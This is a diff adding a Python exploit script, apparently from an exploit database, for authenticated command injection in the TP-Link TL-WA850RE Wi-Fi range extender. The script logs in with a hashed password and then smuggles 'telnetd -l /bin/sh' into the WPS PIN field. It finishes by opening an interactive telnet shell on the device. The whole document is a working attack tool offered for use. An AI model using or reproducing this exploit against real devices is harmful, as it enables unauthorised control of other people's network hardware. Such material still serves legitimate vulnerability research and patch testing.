@@ -1,0 +1,78 @@
+#!/usr/bin/env python
+
+# Exploit Title: TP-Link Technologies TL-WA850RE Wi-Fi Range Extender - Command Execution
+# Date: 19/06/2018
+# Exploit Author: yoresongo - Advisability S.A.S Colombia (www.advisability.co)
+# Vendor Homepage: https://www.tp-link.com/
+# Firmware Link: https://www.tp-link.com/en/download/TL-WA850RE.html 
+# Tested on: Firmware Version TL-WA850RE_V5_180228
+# Contact: yoresongo [at] advisability.co
+
+import argparse
+import requests
+import hashlib
+import telnetlib
+
+parser = argparse.ArgumentParser(
+    description="Exploits TP-LINK WA850RE Command injection"
+)
+parser.add_argument("host", help="Host to attack.", type=str)
+parser.add_argument("password", help="Extender's Password", type=str)
+parser.add_argument(
+    "-C", "--cookie", help="Cookie id value.", type=str, default="1301a8c000c4c505"
+)
+args = parser.parse_args()
+
+HOST = args.host
+PASSWORD = args.password
+COOKIE = args.cookie
+
+
+cookies = {"gsScrollPos-8016": "0", "COOKIE": COOKIE}
+
+headers = {
+    "Origin": "http://%s/" % HOST,
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
+    "User-Agent": "Mozilla/5.0",
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "Accept": "application/json, text/javascript, */*; q=0.01",
+    "Referer": "http://%s/" % HOST,
+    "X-Requested-With": "XMLHttpRequest",
+    "Connection": "keep-alive",
+    "DNT": "1",
+}
+
+
+password = hashlib.md5(PASSWORD.encode("utf-8")).hexdigest().upper()
+encoded = "%s:%s" % (password, COOKIE)
+encoded = hashlib.md5(encoded.encode("utf-8")).hexdigest().upper()
+
+data = [("operation", "login"), ("encoded", encoded), ("nonce", COOKIE)]
+
+# Payload
+data_inject = [
+    ("operation", "write"),
+    ("option", "connect"),
+    ("wps_setup_pin", "11480723;telnetd -l /bin/sh"),
+]
+
+
+with requests.Session() as s:
+    response = s.post(
+        "http://%s/data/login.json" % HOST, headers=headers, cookies=cookies, data=data
+    )
+    print(response.text)
+
+    # An authorised request.
+    r = s.get("http://%s" % HOST, headers=headers, cookies=cookies)
+    # print (r.text)
+    r = s.post(
+        "http://%s/data/wps.setup.json" % HOST,
+        headers=headers,
+        cookies=cookies,
+        data=data_inject,
+    )
+
+tn = telnetlib.Telnet(HOST)
+tn.interact()
